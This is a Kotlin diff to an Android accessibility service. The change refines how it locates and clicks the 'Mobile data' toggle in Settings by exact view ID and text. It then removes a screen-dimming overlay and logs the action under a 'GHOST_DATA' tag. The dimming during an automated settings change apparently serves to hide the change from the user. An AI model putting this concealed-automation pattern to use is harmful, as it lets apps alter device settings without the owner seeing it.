@@ -285,24 +285,26 @@ class MyAccessibilityService : AccessibilityService() {
         if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
             if (isWaitingForDataSettings && pkgName.contains("settings")) {
                 val root = rootInActiveWindow
-                val targetNodes = root?.findAccessibilityNodeInfosByText("data")
+                val targetNodes = root?.findAccessibilityNodeInfosByText("Mobile data")
                 if (!targetNodes.isNullOrEmpty()) {
                     for (node in targetNodes) {
-                        // Normalize exact text by replacing newlines to avoid partial match traps like "2.77 GB of mobile data"
-                        val txt = node.text?.toString()?.replace("\n", " ")?.trim()?.lowercase() ?: ""
-                        if (txt == "mobile data" || txt == "cellular data") {
+                        // STRICT STRUCTURAL MATCH: Only click the node acting as the row title, ignoring graph headers
+                        val viewId = node.viewIdResourceName ?: ""
+                        val text = node.text?.toString() ?: ""
+                        
+                        if (viewId == "android:id/title" && text == "Mobile data") {
                             var parent = node
-                            // Traverse up to find the clickable container
+                            // Traverse up to find the clickable list row container
                             while (parent != null && !parent.isClickable) {
                                 parent = parent.parent
                             }
                             
                             if (parent != null && parent.isClickable) {
-                                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                DebugLogger.log("GHOST_DATA", "Successfully toggled Mobile Data via exact match.")
+                                parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                DebugLogger.log("GHOST_DATA", "Successfully toggled Mobile Data via exact structural match.")
                                 isWaitingForDataSettings = false
                                 // Final step: Restore screen brightness after 2 seconds
-                                Handler(Looper.getMainLooper()).postDelayed({
+                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                     DimmerManager.removeOverlay(applicationContext)
                                 }, 2000)
                                 break
